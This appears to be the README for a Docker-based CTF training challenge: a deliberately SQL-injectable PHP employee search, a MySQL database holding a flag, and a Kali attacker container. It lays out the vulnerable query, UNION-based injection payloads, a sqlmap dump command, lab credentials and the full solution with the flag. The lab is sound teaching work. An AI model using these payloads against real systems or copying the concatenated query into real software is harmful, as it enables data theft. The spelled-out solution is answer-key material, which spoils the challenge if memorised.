# Multi-Machine CTF Challenge Example

## Overview

This is a demonstration of a **multi-machine CTF challenge** where:
- 🌐 **Web Application** (PHP + Apache) - Vulnerable to SQL injection
- 🗄️ **Database** (MySQL) - Contains sensitive data and the flag
- 🥷 **Attacker** (Kali Linux) - Full penetration testing environment

All services run in an **isolated Docker network** and can communicate with each other, but are completely isolated from other challenges.

## Architecture

```
┌─────────────────────────┐
│    Kali Linux (Attacker) │
│    - Full hacking tools  │
│    - Browser, sqlmap     │
│    - MySQL client        │
└───────────┬──────────────┘
            │
       ctf-network (isolated)
            │
    ┌───────┴────────┐
    │                │
┌───▼─────────┐  ┌──▼──────────┐
│ Web App     │  │ MySQL DB    │
│ - PHP       │──│ - employees │
│ - Apache    │  │ - secrets   │
│ - Port 80   │  │ - Port 3306 │
└─────────────┘  └─────────────┘
   (webapp)         (database)
```

## Challenge Details

**Category**: Web Security  
**Difficulty**: Easy  
**Flag**: `CTF{n3tw0rk_s3gm3nt4t10n_1s_1mp0rt4nt}`

### Learning Objectives

1. Understand multi-machine architectures
2. Identify SQL injection vulnerabilities
3. Exploit SQL injection to extract data
4. Access databases directly
5. Enumerate database structures
6. Extract sensitive information

## Vulnerability

The web application has an **SQL Injection** vulnerability in the employee search functionality:

```php
// VULNERABLE CODE
$query = "SELECT username, email, role FROM employees WHERE username LIKE '%$search%'";
```

This allows attackers to:
- Extract database schema
- Access hidden tables
- Read sensitive data
- Obtain the flag

## Attack Path

### Step 1: Access the Web Application
From Kali Linux browser:
```
http://webapp
```

### Step 2: Test for SQL Injection
Try these payloads in the search field:
```
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
admin' OR '1'='1'--
```

### Step 3: Enumerate Database
Extract table names:
```sql
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='employees_db'--
```

Expected tables:
- `employees` - User data
- `secret_data` - Contains the flag!
- `access_logs` - Audit trail

### Step 4: Extract Column Names
```sql
' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='secret_data'--
```

Columns in `secret_data`:
- `id`
- `data_key`
- `data_value`

### Step 5: Extract the Flag
```sql
' UNION SELECT data_key,data_value,NULL FROM secret_data--
```

Or use automated tools from Kali:

```bash
# Using SQLMap
sqlmap -u "http://webapp/?search=test" --dump

# Direct database access (credentials exposed in app)
mysql -h database -u webapp_user -p webapp_pass123
USE employees_db;
SELECT * FROM secret_data;
```

## Credentials

**Database Root**:
- Username: `root`
- Password: `root_password_123`

**Web Application Database User**:
- Username: `webapp_user`
- Password: `webapp_pass123`

**Sample Employee Accounts**:
- admin / admin123 (admin role)
- john.doe / password (user role)
- jane.smith / welcome123 (user role)
- bob.wilson / qwerty (user role)

## Network Isolation

This challenge demonstrates Docker network isolation:

✅ **What Works:**
- Kali can access `http://webapp`
- Kali can connect to `mysql://database:3306`
- Web app can query `database:3306`
- All services share the `ctf-network`

❌ **What Doesn't Work:**
- Cannot access other CTF challenges
- Cannot access host machine directly
- Network is completely isolated per challenge

## Files

- `docker-compose.yml` - Multi-service orchestration
- `Dockerfile.web` - Web application container
- `index.php` - Vulnerable PHP application
- `style.css` - UI styling
- `init.sql` - Database initialization with sample data

## Deployment

The CTF platform automatically:
1. Parses `docker-compose.yml`
2. Creates isolated network: `ctf-example-network`
3. Builds web application image
4. Pulls MySQL 8.0 image
5. Initializes database with `init.sql`
6. Allocates random available ports
7. Deploys Kali Linux attacker
8. Returns access URLs

Example deployment output:
```
🚀 Deploying multi-machine setup...
📦 Found 3 services in docker-compose.yml
🔨 Building webapp...
✅ webapp started: ctf-example-webapp
📌 webapp port 80 -> localhost:42158
🗄️ Pulling image: mysql:8.0
✅ database started: ctf-example-database  
📌 database port 3306 -> localhost:38472
🥷 Deploying Kali Linux...
✅ Kali Linux started
📌 Kali VNC port: localhost:45123

✅ Multi-machine deployment complete!
🔒 All containers isolated in network: ctf-example-network

Access URLs:
🎯 Web App: http://localhost:42158
🗄️ Database: localhost:38472
🥷 Kali GUI: https://localhost:45123 (kasm_user:password)
```

## Solution

1. Open Kali Linux at the provided URL
2. Open Firefox and navigate to `http://webapp`
3. Test SQL injection: `' OR '1'='1--`
4. Enumerate tables: `' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='employees_db'--`
5. Extract from secret_data: `' UNION SELECT data_key,data_value,NULL FROM secret_data--`
6. Find flag: `CTF{n3tw0rk_s3gm3nt4t10n_1s_1mp0rt4nt}`

## Educational Value

This challenge teaches:
- Multi-tier application architecture
- Service-to-service communication
- Network segmentation concepts
- SQL injection exploitation
- Database enumeration techniques
- Using penetration testing tools
- Direct database access
- Data exfiltration methods

## Hints

**Hint 1**: Try adding a single quote `'` to your search query and see what happens.

**Hint 2**: The application displays the SQL query it executes - use this to craft your injection payload.

**Hint 3**: Use UNION-based SQL injection to extract data from other tables. Remember: columns must match!

**Hint 4**: The database has a table called `secret_data` with interesting information.

**Hint 5**: You can also connect directly to the database using credentials leaked in the app!

## Cleanup

The platform automatically cleans up all resources:
```bash
docker stop ctf-example-webapp ctf-example-database ctf-example-attacker
docker rm ctf-example-webapp ctf-example-database ctf-example-attacker
docker network rm ctf-example-network
```

---

**This example demonstrates the power of multi-machine challenges for realistic CTF scenarios!** 🚀
